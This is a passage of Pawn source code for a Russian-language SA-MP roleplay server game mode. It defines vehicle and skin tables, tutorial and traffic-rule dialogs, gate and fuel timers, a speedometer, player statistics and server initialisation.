	{506,3500000},
	{541,4000000},
	{522,3100000},
	{502,4160000},
	{503,4180000},
	{556,8900000},
	{557,9100000},
	{444,9500000},
	{481,2500000},
	{510,2900000},
	{539,19000000}
};
new carsB[29][2]={
	{421,800000},
	{445,850000},
	{489,750000},
	{534,650000},
	{555,1200000},
	{561,1050000},
	{579,1400000},
	{580,950000},
	{589,750000},
	{603,910000},
	{461,1300000},
	{581,1350000},
	{586,1000000},
	{477,1800000},
	{480,2100000},
	{535,1000000},
	{545,1450000},
	{558,1750000},
	{559,1850000},
	{560,2800000},
	{562,2700000},
	{565,1850000},
	{521,2600000},
	{463,1400000},
	{468,800000},
	{554,1000000},
	{434,2100000},
	{409,2950000},
	{495,3100000}
};
new carsC[21][2]={
	{400,170000},
	{404,130000},
	{439,210000},
	{458,160000},
	{466,130000},
	{475,140000},
	{478,90000},
	{492,210000},
	{516,135000},
	{517,225000},
	{518,185000},
	{542,120000},
	{567,270000},
	{405,240000},
	{412,250000},
	{467,290000},
	{474,270000},
	{536,450000},
	{566,290000},
	{551,450000},
	{496,420000}
};
new JoinPed[][] = {
	{98},
	{187},
	{70},
	{147},
	{295},
	{150},
	// МЭРИЯ
	{280},
	{281},
	{284},
	{285},
	{282},
	{288},
	{283},
	{141},
	// PD
	{163},
	{164},
	{286},
	{165},
	{166},
	// FBI
	{71},
	{276},
	{275},
	{274},
	{70},
	{219},
	// Hospital
	{59},
	{240},
	// Lic
	{189},
	{171},
	{172},
	// bank
	{287},
	{191},
	// army
	{102},
	{103},
	{104},
	{195},
	// ballas
	{105},
	{106},
	{107},
	{269},
	{270},
	{271},
	{56},
	// grove
	{114},
	{115},
	{116},
	{193},
	// aztecas
	{108},
	{109},
	{110},
	{190},
	// vagos
	{173},
	{174},
	{175},
	{41},
	// rifa
	{8},
	{42},
	{201},
	// mechanic
	{121},
	{122},
	{117},
	{123},
	{186},
	{120},
	{263},
	// yakuza
	{126},
	{125},
	{112},
	{111},
	{272},
	{233},
	// rm
	{124},
	{46},
	{113},
	{93},
	// lcn
	{188},
	{170},
	{250},
	{217},
	{211},
	// news
	{268}
	//mechanic
};
new JoinReg[8][1] = {
	{5},
	{26},
	{200},
	{162},
	{252},
	// male
	{10},
	{12},
	{41}
};
new DrugsBank[MAX_FRACTION];
new JoinShopF[][2] = {
	{90, 10000},
	{193, 20000},
	{169, 50000},
	{55, 300000},
	{12, 500000},
	{40, 1000000},
	{216, 1500000},
	{214, 2000000},
	{91, 2000000}
};
new JoinShopM[][2] = {
	{36, 5000},
	{182, 5000},
	{15, 10000},
	{24, 20000},
	{2, 20000},
	{143, 20000},
	{1, 50000},
	{258, 50000},
	{21, 75000},
	{180, 75000},
	{20, 100000},
	{221, 100000},
	{299, 200000},
	{291, 250000},
	{18, 300000},
	{154, 300000},
	{19, 300000},
	{17, 300000},
	{60, 400000},
	{249, 500000},
	{296, 500000},
	{289, 750000},
	{23, 750000},
	{101, 750000},
	{48, 1000000},
	{184, 1000000},
	{297, 1500000},
	{185, 2000000},
	{293, 3000000},
	{29, 3000000},
	{223, 4000000},
	{294, 5000000}
};
new newPlayer[][] = {
	/*0*/   {"{FFFF00}   \t\t\t\t\t« Первые шаги »\n\n"},
	/*1*/	{"{ffffff}Первым делом необходимо заработать денег. В штате есть место\n"},
	/*2*/   {"где вы сможете работать без прав, это карьер. Работа там, вы не только\n"},
	/*3*/   {"зарабатываете себе первые деньги, но и поддерживаете экономическую цепь.\n\n"},
	/*4*/   {"Добраться до карьера вам поможет автобусный транспорт.\n\n"},
	/*5*/   {"После того как вы заработаете свои первые деньги, отправляйтесь в автошколу\n"},
	/*6*/   {"и сдавайте экзамен по вождению. Без них у вас нет возможности ездить на\n"},
	/*7*/   {"машинах и устроиться на более высокооплачеваемую и интересную работу.\n"},
	/*8*/   {"Стоимость экзамена по вождению: {FFFF00}1000{ffffff}$, для новичков 300$\n"},
	/*9*/   {"Перед поездкой в автошколу убедитесь, что у вас имеется такая сумма."},
	/*10*/  {"\n\nОстальную информацию можно прочитать в {FFFF00}'/mm'{ffffff} > Полезная информация"}
};
new pddMSG[][] = {
	/*0*/    {"{FFFF00}1. Общие правила\n"},
	/*1*/    {"{ffffff}Обгон транспортного средства разрешен только с левой стороны,\n"},
	/*3*/    {"при этом водители обязаны убедиться, что встречная полоса свободна на достаточном для обгона расстояние.\n"},
	/*4*/    {"При ДТП водители обязаны позвонить в полицию (/c), и дождаться ДПС\n\n"},
	/*5*/    {"{FFFF00}2. Скорость движения\n"},
	/*6*/    {"{ffffff}Ограничение скорости за переделами города неограничено\n"},
	/*7*/    {"Ограничение скорости в пределах города и населенных пунктов не более 60 км/ч\n\n"},
	/*8*/    {"{FFFF00}3. Остановка и стоянка\n"},
	/*6*/    {"{ffffff}Остановка и стоянка транспортных средств разрешаются на правой стороне дороги на обочине.\n"},
	/*7*/    {"В специальных отведённых для этого местах\n\n"},
	{"{FFFF00}4. ДПС\n"},
	/*6*/    {"{ffffff}При виде автомобиля с включённой сереной, водитель обязан сбавить скорость и прижаться к обочине.\n"},
	/*7*/    {"Водитель обязан предъявить паспорт/лицензии, если тот попросил\n"},
	/*8*/    {"________________\n\n"},
	/*9*/    {"Клавиша {FFFF00}2{ffffff}\t\t\tзавести или заглушить двигатель\n"},
	/*10*/   {"Клавиша {FFFF00}Левый Ctrl{ffffff}\t\tвключить или выключить ограничитель скорости\n"},
	/*11*/   {"Клавиша {FFFF00}Левый Alt{ffffff}\t\tвключить или выключить фары\n"}
};
stock t_SetPlayerPos( playerid, Float:x, Float:y, Float:z )
{
	SetPlayerPos( playerid, x, y, z );
	PlayerInfo[ playerid ][ pPos_x ] = x;
	PlayerInfo[ playerid ][ pPos_y ] = y;
	PlayerInfo[ playerid ][ pPos_z ] = z;
	SetPVarInt(playerid, "AntiBreik", 3);
	return true;
}
#define SetPlayerPos t_SetPlayerPos
stock t_SetVehiclePos(vehicleid, Float:x, Float:y, Float:z)
{
	SetVehiclePos(vehicleid, x, y, z );
	VehiclePos[vehicleid][0] = x;
	VehiclePos[vehicleid][1] = y;
	VehiclePos[vehicleid][2] = z;
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(GetPlayerState(i) == 2 && GetPlayerVehicleID(i) == vehicleid)
		{
			PlayerInfo[ i ][ pPos_x ] = x;
			PlayerInfo[ i ][ pPos_y ] = y;
			PlayerInfo[ i ][ pPos_z ] = z;
			SetPVarInt(i, "AntiBreik", 3);
		}
	}
	return true;
}
#define SetVehiclePos t_SetVehiclePos
stock SPD(playerid, dialogid, style, caption[], info[], button1[], button2[])
{
	ShowPlayerDialog(playerid, dialogid, style, caption, info, button1, button2);
	SetPVarInt(playerid, "USEDIALOGID", dialogid);
	return true;
}
#define ShowPlayerDialog SPD
stock Float:GetDistanceBetweenPoints(Float:X, Float:Y, Float:Z, Float:PointX, Float:PointY, Float:PointZ)
{
	new Float:Distance;Distance = floatabs(floatsub(X, PointX)) + floatabs(floatsub(Y, PointY)) + floatabs(floatsub(Z, PointZ));
	return Distance;
}
stock Float:GetDistanceBetweenPlayers(p1,p2)
{
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}
main()
{
	print("_______________________________________________");
	if(mysql_ping() == 1) printf(" Подключение к базе `%s` успешно", SQL_DB);
	else printf(" Подключение к базе `%s` не успешно", SQL_DB);
	print("_______________________________________________");
}
forward SaveShahta();
public SaveShahta()
{
   new iniFile = ini_openFile("shahta.ini");
   ini_setInteger(iniFile, "Shaht", Metall);
   ini_setInteger(iniFile, "Zavod", Zavodz);
   ini_setInteger(iniFile, "Patron", Patronbox);
   ini_closeFile(iniFile);
}
forward LoadShahta();
public LoadShahta()
{
    new iniFile = ini_openFile("shahta.ini");
    ini_getInteger(iniFile, "Shaht", Metall);
    ini_getInteger(iniFile, "Zavod", Zavodz);
    ini_getInteger(iniFile, "Patron", Patronbox);
    ini_closeFile(iniFile);
	return 1;
}
stock IsPlayerApplyAnimation(playerid, animation[])
{
    if(!GetPlayerAnimationIndex(playerid)) return 0;
    new animlib[32], animname[32];
    GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, sizeof(animlib), animname, sizeof(animname));
    if(strcmp(animname, animation, true) == 0) return 1;
	return 0;
}
stock DropYas(playerid) // сброс ящика
{
		TOTALY ++;
    	new Float:f[4];
	    GetPlayerPos(playerid,f[0],f[1],f[2]);
    	DYaz[TOTALY][g_y][0] = f[0];
		DYaz[TOTALY][g_y][1] = f[1];
		DYaz[TOTALY][g_y][2] = f[2] - 0.95;
    	DYaz[TOTALY][g_yid] = CreateDynamicObject(2358,f[0], f[1], f[2] - 0.95, 0.0,0.0, 90.0);
    	return true;
}
stock DeleteObject(playerid)
{
	DestroyDynamicObject(Objectbox[playerid]);
}
stock SlivList(playerid)
{
	new str[90], str2[2048];
	for(new i = 1; i <= TOTALSL[PlayerInfo[playerid][pMember]]; i++)
	{
		format(str, sizeof(str), "{ffffff}№{29ACD4}%i{ffffff} - Смерть: {29ACD4}%s{ffffff}\n",i, SlivInfo[TOTALSL[PlayerInfo[playerid][pMember]]][PlayerInfo[playerid][pMember]][pName]);
		strcat(str2, str);
	}
	if(TOTALSL[PlayerInfo[playerid][pMember]] == 0) return ShowPlayerDialog(playerid, D_NULL, 0, "Смерти", "На каптуре не было ни одной смерти с вашей стороны.", "Закрыть", "");
	ShowPlayerDialog(playerid, 1130, DIALOG_STYLE_MSGBOX, "Смерти", str2, "Принять", "Отмена");
	return 1;
}
forward SetPlayerRadio(playerid);
public SetPlayerRadio(playerid)
{
	if(PlayerRadio[playerid] == 1)
	{
		if(CellTime[playerid] != -1) return true;
		PlayAudioStreamForPlayer(playerid, "http://listen1.myradio24.com:9000/8458", 0.0,0.0,0.0, 20, 0);
	}
	else StopAudioStreamForPlayer(playerid);
	return true;
}
forward SaveAcc();
public SaveAcc()
{
	SendAdminMessage(COLOR_BLUE, "[A] » Выполняется сохранение всех аккаунтов");
	for(new j = 0; j <= MAX_PLAYERS; j++)
	{
		if(!IsPlayerConnected(j) || PlayerLogged[j] == 0) continue;
		SaveAccount(j);
		SetPlayerSkills(j);
	}
	SendAdminMessage(COLOR_OOC, "[A] » Сохранение прошло успешно, следующее через 900 секунд");
	return true;
}
forward BankList(playerid);
public BankList(playerid)
{
	if(GetPVarInt(playerid, "PriceATM") == 0)
	{
		ShowPlayerDialog(playerid, D_ATM+932, 2, "Банкомат", "[1] Баланс счета\n[2] Снять со счета\n[3] Баланс домашнего счета\n[4] Баланс бизнес счета\n[5] Пополнить мобильный счет", "Далее", "Выход");
	}
	return true;
}
forward CheckRentCar(playerid);
public CheckRentCar(playerid)
{
	if(GetPlayerState(playerid) != 2) return true;
	if(GetPVarInt(playerid, "RentTaxi") == GetPlayerVehicleID(playerid) || GetPVarInt(playerid, "RentBus") == GetPlayerVehicleID(playerid) || rent_Vehicle[playerid] == GetPlayerVehicleID(playerid)) return true;
	else
	{
		RemoveFromVehicle(playerid);
	}
	return true;
}
forward DrugEffectGone(playerid);
public DrugEffectGone(playerid)
{
	new time[3];
	gettime(time[0], time[1], time[2]);
	SetPlayerTime(playerid, time[0], time[1]);
	SetPlayerWeather(playerid, 7);
	SetPlayerDrunkLevel (playerid, 0);
	return true;
}
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	new string[64];
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerLogged[clickedplayerid] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	NameStats[playerid] = clickedplayerid;
	format(string, 64, "Изменить статистику: %s", sendername(clickedplayerid));
	ShowPlayerDialog(playerid,D_UCPADMIN, DIALOG_STYLE_LIST, string, "Изменить имя игрока\nИзменить пароль игрока\nИзменить уровень администратора\nИзменить уровень игрока\nИзменить уважение игрока\nИзменить пол игрока\nИзменить статус игрока\nДать кредиты", "Принять", "Отмена");
	return true;
}
forward PlayerToggle(playerid);
public PlayerToggle(playerid)
{
	TogglePlayerControllable(playerid,true);
	return true;
}
forward GateLic();
public GateLic()
{
	MoveObject(Object[0],-2057.18994141,-101.19999695,34.90000153-0.004,0.004, 0.00000000,-90.00000000,270.00000000);
	return false;
}
forward GatePex();
public GatePex()
{
	MoveObject(vorota,285.6441, 1817.2820, 18.3479, 3.0, 0.0000, 0.0000, 270.0000);
	MoveObject(vorota2,285.6448, 1825.2371, 18.3538, 3.0,0.0000, 0.0000, 270.1800);
	return 0;
}
forward GateFBI();
public GateFBI()
{
	MoveObject(vorota3,-1946.0976, -1015.3544, 35.0999, 3.0, 0.0000, 0.0000, 0.0000);
	return 0;
}
forward GateFSF();
public GateFSF()
{
	MoveObject(Object[7],-1044.65002441,-1328.19921875,130.30000305,3.0, 0.00000000,0.00000000,0.00000000);
	MoveObject(Object[8],-1052.59997559,-1328.19921875,130.30000305,3.0, 0.00000000,0.00000000,0.00000000);
	return false;
}
forward GateSFO();
public GateSFO()
{
	MoveObject(Object[1],-1701.43395996,687.69000244,24.65999794-0.004,0.004, 0.00000000,90.00000000,270.00000000);
	return false;
}
forward GateSFT();
public GateSFT()
{
	MoveObject(Object[2],-1572.18994141,658.70001221,6.89099789-0.004,0.004, 0.00000000,90.00000000,90.00000000);
	return false;
}
forward GateLS();
public GateLS()
{
	MoveObject(Object[3],1544.69006348,-1630.90002441,13.13999939-0.004,0.004, 0.00000000,90.00000000,90.00000000);
	return false;
}
forward GateLV();
public GateLV()
{
	MoveObject(Object[4],2238.19995117,2450.29980469,10.65000057-0.004,0.004, 0.00000000,90.00000000,90.00000000);
	return false;
}
public OnUnoccupiedVehicleUpdate(vehicleid, playerid, passenger_seat) return true;
new heaptime;
forward SecUpdate();
public SecUpdate()
{
	heaptime++;
	new heap = heapspace();
	if(heaptime == 60)
	{
		printf("SecUpdate() STK %d", heap);
	}
	Timer();
	new string[128];
	HealthCheck();
	ArmourCheck();
	MoneyCheck();
	GzCheck();
	GlobalAfkCheck();
	for(new i = 1; i <= 5; i++)
	{
		new j = i - 1;
		if(MafiaFuelTime[j] > 0) MafiaFuelTime[j]--;
		if(MafiaInfo[3][mFuel][j] < 220 && MafiaFuelTime[j] == 0)
		{
			MafiaInfo[3][mFuel][j] += random(30) + 50;
			MafiaFuelTime[j] = random(60) + 100;
			format(MafiaInfo[3][mFuels], 128, "%i, %i, %i, %i, %i", MafiaInfo[3][mFuel][0],
			MafiaInfo[3][mFuel][1], MafiaInfo[3][mFuel][2], MafiaInfo[3][mFuel][3], MafiaInfo[3][mFuel][4]);
			SetMafiaStr(3, "fuel", MafiaInfo[3][mFuels]);
			format(string, 50, "Топлива в скважине: {FF9900}%i{ffffff} литров", MafiaInfo[3][mFuel][j]);
			Update3DTextLabelText(tPickup[20+j], 0xffffffff, string);
		}
	}
	if(PickDate <= gettime() && Pick == true) ResetPick(), SendClientMessageToAll(0xBC331AFF, "Внмание! В штате закончились выборы. Посмотреть результаты: /picklist");
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(GZSafeTime[i] > 0)
		{
			GZSafeTime[i]--;
			foreach(new x:Player)
			{
				if(PlayerInfo[x][pMember] == GZInfo[i][gNapad] || PlayerInfo[x][pMember] == GZInfo[i][gFrak])
				{
					new stringText[30];
					Convert(GZSafeTime[i], stringText);
					TextDrawSetString(CaptTime[x], stringText);
				}
			}
		}
	}
	PlayerTimer();
	for(new i =0;i<sizeof(FrakCD);i++)
	{
		if(FrakCD >0)
		{
			FrakCD --;
			if(FrakCD == 0) SendFMes(i,COLOR_LIGHTRED,"Захват зоны снова может состоться.");
		}
	}
	for(new f =0;f<3;f++)
	{
		if(MZSafeTime[f]>0)
		{
			MZSafeTime[f] --;
			if(MZSafeTime[f] == 200 || MZSafeTime[f] == 450)
			{
				format(string,sizeof(string),"У вас осталось %d секунд. Место встречи: Заброшенный аэропорт",MZSafeTime[f]);
				SendFMes(MZInfo[f][mNapad],COLOR_RED,string);
				for(new h = 0; h < MAX_BIZZ; h++)
				{
					if(BizzInfo[h][bZahvat] == 1)
					{
						SendFMes(BizzInfo[h][bMafia],COLOR_RED,string);
					}
				}
			}
		}
	}
	for(new s = 0; s <= MAX_VEHICLES; s++)
	{
		if(GetVehicleModel(s) == 0 || s == INVALID_VEHICLE_ID) continue;
		new Float:vehpos[3];
		GetVehiclePos(s,vehpos[0],vehpos[1],vehpos[2]);
		if(vehpos[2] > 1000.00 && !IsAPlane(s))
		{
			SetVehiclePos(s,VehiclePos[s][0],VehiclePos[s][1],VehiclePos[s][2]);
		}
	}
	saveacc++;
	if(mzcheck == 900)
	{
		saveacc = 0;
		SaveAcc();
	}
	mzcheck++;
	if(mzcheck == 1200)
	{
		mzcheck = 0;
	}
	fuelcheck++;
	if(fuelcheck == 10)
	{
		fuelcheck = 0;
		for(new v = 0; v <= MAX_VEHICLES; v++)
		{
			if(GetVehicleModel(v) == 0) continue;
			if(IsAPlane(v) == 1 || IsABoat(v) == 1) continue; // и мопед
			if(Engine[v] == true && Fuel[v] > 0)
			{
				Fuel[v]--;
				if(Fuel[v] < 1)
				{
					Engine[v] = false;
					Lights[v] = false;
					PlayerFuelMes[v] = true;
					GetVehicleParamsEx(v,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(v,0,0,alarm,doors,bonnet,boot,objective);
					Fuel[v] = 0;
				}
			}
		}
	}
	if(heaptime == 60)
	{
		heaptime = 0;
		printf("SecUpdate() STK %d (%d LOSS)", heapspace(), (heap - heapspace()));
	}
}
public UpdateSpeedometr(playerid)
{
	CheckCar(playerid);
	if(GetPlayerState(playerid) == 2)
	{
		if(IsAPlane(GetPlayerVehicleID(playerid)) || IsABoat(GetPlayerVehicleID(playerid)) || IsAMoped(GetPlayerVehicleID(playerid))) return true;
		new locked[32],str[64],str2[64],str3[64],str4[64], str5[64], str6[64], Float:vehhel, vehh[20], vehs[20], vehe[20], veher[20];
		if(IsLocked[GetPlayerVehicleID(playerid)] == true) locked = "~r~LOCK";
		else locked = "~g~UNLOCK";
		UnSurfCar(GetPlayerVehicleID(playerid));
		GetVehicleHealth(GetPlayerVehicleID(playerid), vehhel);
		if(vehhel <= 500) vehh = "~r~";
		else vehh = "";
		if(Fuel[GetPlayerVehicleID(playerid)] / 2 <= 30) vehs = "~r~";
		else vehs = "";
		if(Engine[GetPlayerVehicleID(playerid)] == true) vehe = "~y~ON";
		else vehe = "~r~OFF";
		if(VehRe[playerid] == true) veher = "~g~LIMIT";
		else veher = "~r~LIMIT";

		format(str, sizeof(str),"%d KM/H",SpeedVehicle(playerid) / 2);
		if(vehhel <= 300) format(str3, sizeof(str3),"%s30%",vehh); else format(str3, sizeof(str3),"%s%.0f%",vehh,vehhel / 10);
		format(str2, sizeof(str2), "%s", locked);
		format(str4, sizeof(str4), "%s%d", vehs,Fuel[GetPlayerVehicleID(playerid)]);
		format(str5, sizeof(str5), "%s", vehe);
		format(str6, sizeof(str6), "%s", veher);

		TextDrawSetString(FuelShow[playerid],str4);
		TextDrawSetString(HealthShow[playerid],str3);
		TextDrawSetString(SpeedShow[playerid],str);
		TextDrawSetString(StatusShow[playerid],str2);
		TextDrawSetString(Speed2Show[playerid],str6);
		TextDrawSetString(EngineShow[playerid],str5);
	}
	return false;
}
forward BadEngine();
public BadEngine()
{
	new veh1, Float:spd[3], Float:hls;
	for(new i = 0; i != MAX_PLAYERS; i++)
	{
		if( !BE_Play_Check[i] || GetPlayerState(i) != PLAYER_STATE_DRIVER ) { continue; }
		veh1 = GetPlayerVehicleID( i );
		if( !veh1 ) { continue; }
		GetVehicleHealth( veh1, hls );
		if((hls > BE_MIN_HLS) && VehRe[i] == true) { continue; }
		GetVehicleVelocity( veh1, spd[0], spd[1], spd[2] );

		if( floatabs(spd[0]) > floatabs(spd[1]) )
		{
			if( floatabs(spd[ 0 ]) > BE_MAX_SPD )
			{
				hls = BE_MAX_SPD / floatabs(spd[ 0 ]);
				SetVehicleVelocity( veh1, spd[0]*hls, spd[1]*hls, spd[2] );
			}
		}
		else
		{
			if( floatabs(spd[ 1 ]) > BE_MAX_SPD )
			{
				hls = BE_MAX_SPD / floatabs(spd[ 1 ]);
				SetVehicleVelocity( veh1, spd[0]*hls, spd[1]*hls, spd[2] );
			}
		}
	}
	return true;
}
public Stats(playerid,targetid)
{
	new exp = PlayerInfo[targetid][pExp];
	new level = PlayerInfo[targetid][pLevel];
	new warns = PlayerInfo[targetid][pWarn];
	new atext[20],ttexttt[32];
	if((PlayerInfo[targetid][pVoennik]) == 0) format(ttexttt,sizeof(ttexttt),"Не служил");
	else format(ttexttt,sizeof(ttexttt),"Служил");
	if(PlayerInfo[targetid][pSex] == 1) { atext = "Мужчина"; }
	else if(PlayerInfo[targetid][pSex] == 2) { atext = "Женщина"; }
	new ptext[20], mtext[MAX_PLAYER_NAME];
	if(PlayerInfo[targetid][pPhone][0] > 0) format(ptext, sizeof(ptext), "%i", PlayerInfo[targetid][pPhone][1]);
	else format(ptext, sizeof(ptext), "Нет");
	if(PlayerInfo[targetid][pMarried] == false) format(mtext, sizeof(mtext), "Нет");
	else format(mtext, sizeof(mtext), "%s", PlayerInfo[targetid][pWhoMarried]);
	new coordsstring[512];
	new msg[] = "{ffffff}Имя:\t\t\t{8d8dff}%s\n\n{ffffff}Уровень:\t\t%d\nExp:\t\t\t%d из %d\nРегистрация:\t\t%s\nПредупреждения:\t%d\n\nСлужил:\t%s\nЗаконопослушность:\t%d\n\
	{ffffff}Наличные:\t\t%i$\nРозыск:\t\t%i\nМатериалы:\t\t%i\nНаркотики:\t\t%i\nТелефон:\t\t%s\nБрак:\t\t\t%s\nПол:\t\t\t%s\n\nРабота:\t\t%s\nОрганизация:\t\t%s\nРанг:\t\t\t%s\n\nБизнеc:\t\t%s\nДом:\t\t\t%s\nТранспорт:\t\t%s{B4B5B7}\n----------------------DONATE--------------------\nПремиум:\t\t%s\nКредитов:\t\t%d{FFFFFF}";
	format(coordsstring, 512, msg,PlayerInfo[targetid][pSendername],level,exp,PlayerInfo[targetid][pLevel]*8,PlayerInfo[targetid][pRegData],warns,ttexttt,PlayerInfo[targetid][pZakon],
	GetMoney(targetid),PlayerInfo[targetid][pWanted],PlayerInfo[targetid][pMats], PlayerInfo[targetid][pDrugs],ptext,mtext,atext,GetJobName(targetid),GetFracName(targetid),GetRangName(targetid)
	,(GetPlayerBizz(targetid)) ? ("Да") : ("Нет"),(GetPlayerHouse(targetid)) ? ("Есть") : ("Нет"),(GetPlayerHouse(targetid)) ? ("Есть") : ("Нету"),(PlayerInfo[targetid][pVIP]) ? ("First Premium") : ("Нет"),PlayerInfo[targetid][pCredits]);
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"{a6cd1b}Статистика персонажа",coordsstring,"Закрыть","");
}
public AutoSkills(playerid)
{
	GetVehicleHealth(GetPlayerVehicleID(playerid), nowvehheal[playerid]);
	if(Engine[GetPlayerVehicleID(playerid)] == false) return true;
	if(nowvehheal[playerid] >= VehicleHealNow[playerid])
	{
		if(PlayerInfo[playerid][pGunSkill][6] >= MAX_SKILLS_PLAYER) return true;
		PlayerInfo[playerid][pGunSkill][6]++;
		if(PlayerInfo[playerid][pGunSkill][6] == MNORM_SKILLS_PLAYER)
		{
			if(GetPVarInt(playerid,"AutoSkillBool") == 1)
			{
				SendClientMessage(playerid, COLOR_GREEN, ""PlayerLimiterMoreB"");
				SetPVarInt(playerid,"AutoSkillBool",0);
			}
		}
	}
	else if(nowvehheal[playerid] < VehicleHealNow[playerid])
	{
		if(PlayerInfo[playerid][pGunSkill][6] == 0) return true;
		else
		{
			PlayerInfo[playerid][pGunSkill][6] -= floatround((VehicleHealNow[playerid] - nowvehheal[playerid]) / 5);
			if(PlayerInfo[playerid][pGunSkill][6] < NORM_SKILLS_PLAYER && PlayerInfo[playerid][pGunSkill][6] > MIN_SKILLS_PLAYER)
			{
				if(GetPVarInt(playerid,"AutoSkillBool") == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTRED, ""PlayerLimiterMoreM"");
					SetPVarInt(playerid,"AutoSkillBool",1); VehRe[playerid] = false;
				}
			}
			else if(PlayerInfo[playerid][pGunSkill][6] < MIN_SKILLS_PLAYER)
			{
				PlayerInfo[playerid][pGunSkill][6] = 0;
			}
		}
	}
	GetVehicleHealth(GetPlayerVehicleID(playerid), VehicleHealNow[playerid]);
	return true;
}
public AntiBH(playerid)
{
	if(times[playerid] == false)
	{
		ApplyAnimation(playerid,"PED","getup_front",4.0,0,0,0,0,0);
		times[playerid] = true;
	}
	return true;
}
public OnGameModeInit()
{
	SetNameTagDrawDistance(15.0);
	new heap = heapspace();
	SetTimer("UpdateShahtStart",100,false);
	printf("OnGameModeInit() STK %d", heap);
	SetGameModeText("LOADING...");
	GameModeLoaded = false;
	mysql_debug(MySQL_DEBUG);
	mysql_connect(SQL_HOST, SQL_USER, SQL_DB, SQL_PASS);
	mysql_set_charset("cp1251_general_ci");
	mysql_query("SET NAMES 'cp1251'");
	mysql_query("SET CHARACTER SET 'cp1251'");
	AntiDeAMX();
	new shahtstr[512];
    new Zavodstring[512];
	format(shahtstr,sizeof(shahtstr),"{00EBFF}Металла на складе:{FFFFFF}\n{7CFC00}%d кг",Metall);
	skladik = Create3DTextLabel(shahtstr,0xFFFFFFFF,-449.8198,1440.9951,22.1830,25,0,1);
	format(Zavodstring,sizeof(Zavodstring),"{00EBFF}Металла на складе:{FFFFFF}\n{7CFC00}%d кг",Zavodz);
	skladik1 = Create3DTextLabel(Zavodstring,0xFFFFFFFF,2565.5203,-1292.8928,1045.0704,15,0,1);
	format(Zavodstring,sizeof(Zavodstring),"{00EBFF}Металла на складе:{FFFFFF}\n{7CFC00}%d кг",Zavodz);
	skladik2 = Create3DTextLabel(Zavodstring,0xFFFFFFFF,2593.2634,2783.1023,12.9844,15,0,1);
	format(shahtstr,sizeof(shahtstr),"{FFBE00}Ящиков с патронами на складе:{FFFFFF}\n{7CFC00}%d",Patronbox);
	patron3D = Create3DTextLabel(shahtstr,0xFFFFFFFF,2533.9407,-1303.9077,1044.6198,25,0,1);
	ManualVehicleEngineAndLights();
	EnableStuntBonusForAll(0);
	ShowPlayerMarkers(2);
	DisableInteriorEnterExits();
    SendRconCommand("mapname "#Version);
	new weather = random(sizeof(WEATHER));
	SetWeather(weather);
	gettime(ghour,gminute,gsecond);
	SetWorldTime(ghour);
	LoadTextDraws();
	LoadTimers();
	LoadHouse();
	LoadBizz();
	LoadObject();
	LoadVeh();
	LoadEnters();
	LoadGZ();
	LoadMafia();
	LoadMayor();
	LoadATM();
	LoadOther();
	LoadShahta();
	LoadPickups();
	LSy();
	LoadFrac();
	LoadFarm();
	LoadDuch();
	for(new p=0;p<MAX_VEHICLES;p++) SetVehicleNumberPlate(p,""Namemode""), Fuel[p] = 100;
	lastveh = CreateVehicle(542,0,0,0,0,0,0,0);
	GameModeLoaded = true;
	DestroyVehicle(lastveh);
	SetGameModeText(""Namemode"");
	printf("OnGameModeInit() STK %d (%d LOSS)", heapspace(), (heap - heapspace()));
	return true;
}
public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	new str[500];
	format(str, sizeof(str), "SetPlayerAttachedObject(playerid, %d, %d, %d, %.4f, %.4f, %.4f, %.2f, %.2f, %.2f, %.2f, %.2f, %.2f)", index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
	printf(str);
	if(!IsPlayerInAnyVehicle(playerid)) SetPlayerAttachedObject(playerid, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
	else AttachObjectToVehicle(GetPVarInt(playerid, "VehicleObj"), GetPlayerVehicleID(playerid), fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ);
}
public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	if(GetPVarInt(playerid, "LoadATM") > 0)
	{
		if(!playerobject)
		{
			if(!IsValidObject(objectid)) return true;
			MoveObject(objectid, fX, fY, fZ, 10.0, fRotX, fRotY, fRotZ);
		}
		if(response == EDIT_RESPONSE_FINAL)
		{
			TOTALATM++;
			ATMInfo[TOTALATM][aX] = fX;
			ATMInfo[TOTALATM][aY] = fY;
			ATMInfo[TOTALATM][aZ] = fZ;
			ATMInfo[TOTALATM][arX] = fRotX;
			ATMInfo[TOTALATM][arY] = fRotY;
			ATMInfo[TOTALATM][arZ] = fRotZ;
			SendClientMessage(playerid,COLOR_YELLOW,"ИНФО: Вы установили банкомат");
			DestroyObject(GetPVarInt(playerid, "LoadATM")-1);
			ATM[TOTALATM] = CreateObject(2754, fX, fY, fZ, fRotX, fRotY, fRotZ);
			LABELATM[TOTALATM] = Create3DTextLabel("Нажмите: ALT",COLOR_YELLOW, ATMInfo[TOTALATM][aX],ATMInfo[TOTALATM][aY],ATMInfo[TOTALATM][aZ],20.0,0,1);
			DeletePVar(playerid, "LoadATM");
			CancelEdit(playerid);
			new str[2048];
